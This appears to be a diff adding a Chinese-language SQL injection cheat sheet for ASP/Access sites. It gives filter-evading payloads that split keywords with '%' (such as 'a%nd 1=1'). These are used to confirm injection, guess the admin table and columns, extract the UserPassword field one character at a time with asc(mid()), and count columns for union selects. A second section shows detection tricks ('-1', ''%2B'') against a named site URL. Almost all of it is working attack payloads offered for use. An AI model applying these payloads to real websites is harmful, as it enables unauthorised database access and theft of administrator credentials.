@@ -1,0 +1,78 @@
+利用语句：
+
+a%nd 1=1 就是 and 1=1 的意思  返回正常
+
+a%nd 1=2 and 1=2   返回错误 说明存在注入
+
+a%nd ex%ists(%select * %from ad%min)    或者   a%nd (%select count(*) from ad%min)>0
+查询是否存在ADMIN这个表名  返回正确 说明存在ADMIN这个表名
+
+and exists (select top 1 [admin] from [admin])
+a%nd ex%ists(%select top 1 [ad%min] from [ad%min]) 查询ADMIN表里是否存在ADMIN这个字段 正确说明存在
+
+and exists (select top 1 [UserPassword from [admin])
+a%nd ex%ists(%select top 1 [UserPassword] from [ad%min]) 查询ADMIN表里是否存在UserPassword这个字段
+
+正确说明存在UserPassword这个字段
+
+
+and (select top 1 len(admin) from admin)>N
+a%nd (%select top 1 len(ad%min) from ad%min)>N  查询字段长度 如果>5返回错误页面,>4返回正常页面，则证明字段为5
+证明ADMIN这个字段为5
+
+and (select top 1 asc(mid(列名,N,1)) from 表名)>N  //前面的N代表当前猜解第几位数据，后面的N代表ASCII码,英文和数字的ASCII码在1-128之间
+a%nd (%select top 1 asc(mid(admin,N,1)) from admin)>N
+a 是97 返回正确 第一个是a d是99 依次类推 最后可以得到用户名为admin
+
+联合查询：
+
+order by 12
+o%rder by 12
+
+and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12 from admin
+a%nd 1=2 union %select 1,2,3,4,5,6,7,8,9,10,11,12 from ad%min 
+
+
+
+
+
+着安检的提高，现在有很多防注入程序都屏蔽 and、1=1、1=2 类似这样的关键字，如果再使用这样的方法有时将不能探测到注入点了。
+
+举例：http://www.yesck.com/news.asp?id=123
+
+
+
+1、打开地址，我们可以看到是一个正常的页面。
+
+2.、然后在地址后面加上-1，变成：http://www.yesck.com/news.asp?id=123-1，若返回的页面和前面不同，是另一个正常的页面，则表示存在注入漏洞，而且是数字型的注入漏洞
+
+3、若在地址后面加上 -0，变成 http://www.yesck.com/news.asp?id=123-0，返回的页面和之前的页面相同，然后加上-1，返回错误页面，则也表示存在注入漏洞，而且是数字型的。
+
+4、若在地址后面加上’%2B’，变为：http://www.yesck.com/news.asp?id=123′%2B’，返回的页面和之前的相同；再加上’2%2B’sb，地址变为：http://www.yesck.com/news.asp?id=123′%2Bsb，返回另一个正常的页面，或者说未发现该条记录，或者错误，则表示存在注入漏洞，而且是文本型的。
+
+
+
+原因分析：
+
+如果SQL语句是这样执行的(数字)：select * from news where id=123
+
+当在后面加上 -1 后，语句变为select * from news where id=123-1
+
+但是SQL服务器在执行这条语句时会先进行运算123-1即为122，然后执行的是：select * from news where id=122
+
+这样选出来的就是另外一条页面记录了。如果该页面存在，就是另一个页面；否则将会显示记录不存在，或者出错。这也同时表示程序未对输入的数据进行过滤，存在数值型的注入漏洞。
+
+如果SQL语句是这样执行的(字符)：select * from news where id=’123′
+
+在后面加上 ‘%2B’ 之后，语句变为：select * from news where id=’123′+” （%2B 是 + 的URL编码）
+
+这时SQL服务器实际执行的是：select * from news where id=’123′，会返回同样的页面。
+
+在后面加上 ‘%2B’sb之后，语句变为：select * from news where id=’123′+’sb’ （同样道理，SQL会先执行’123′+’sb’）
+
+则SQL实际执行的是：select * from news where id=’123sb’，返回页面不存在，或者显错，就表示有文本型的注入漏洞。 
+
+
+
+
+
